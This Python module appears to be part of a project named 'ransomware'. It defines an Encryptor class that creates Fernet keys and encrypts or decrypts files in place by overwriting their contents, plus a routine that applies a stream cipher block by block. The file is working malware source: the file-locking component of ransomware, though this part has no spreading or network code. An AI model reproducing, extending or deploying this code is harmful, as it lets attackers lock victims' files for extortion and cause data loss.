from cryptography.fernet import Fernet
from ransomware.logging import logger
from ransomware.exceptions import EncryptionError

class Encryptor:
    """
    Handles file encryption and decryption using Fernet symmetric encryption.
    Provides methods for encrypting, decrypting, and in-place modification of files.
    """
    def __init__(self, key: bytes):
        """
        Initialize the Encryptor with a symmetric key.
        """
        self.fernet = Fernet(key)

    @staticmethod
    def generate_key() -> bytes:
        """
        Generate a new Fernet symmetric encryption key.
        """
        return Fernet.generate_key()

    def encrypt_file(self, file_path: str) -> None:
        """
        Encrypt the contents of a file in-place.
        """
        try:
            with open(file_path, 'rb') as f:
                data = f.read()
            encrypted = self.fernet.encrypt(data)
            with open(file_path, 'wb') as f:
                f.write(encrypted)
            logger.info(f"Encrypted {file_path}")
        except Exception as e:
            logger.error(f"Encryption error: {e}")
            raise EncryptionError(str(e))

    def decrypt_file(self, file_path: str) -> None:
        """
        Decrypt the contents of a file in-place.
        """
        try:
            with open(file_path, 'rb') as f:
                data = f.read()
            decrypted = self.fernet.decrypt(data)
            with open(file_path, 'wb') as f:
                f.write(decrypted)
            logger.info(f"Decrypted {file_path}")
        except Exception as e:
            logger.error(f"Decryption error: {e}")
            raise EncryptionError(str(e))

    def modify_file_inplace(self, filename: str, crypto_func, blocksize: int = 16) -> None:
        """
        Open `filename` and encrypt/decrypt according to `crypto_func` (stream cipher).
        Useful for custom or legacy stream cipher operations.
        """
        with open(filename, 'r+b') as f:
            plaintext = f.read(blocksize)
            while plaintext:
                ciphertext = crypto_func(plaintext)
                if len(plaintext) != len(ciphertext):
                    raise ValueError(f'Ciphertext({len(ciphertext)}) is not of the same length as Plaintext({len(plaintext)}). Not a stream cipher.')
                f.seek(-len(plaintext), 1)
                f.write(ciphertext)
                plaintext = f.read(blocksize) 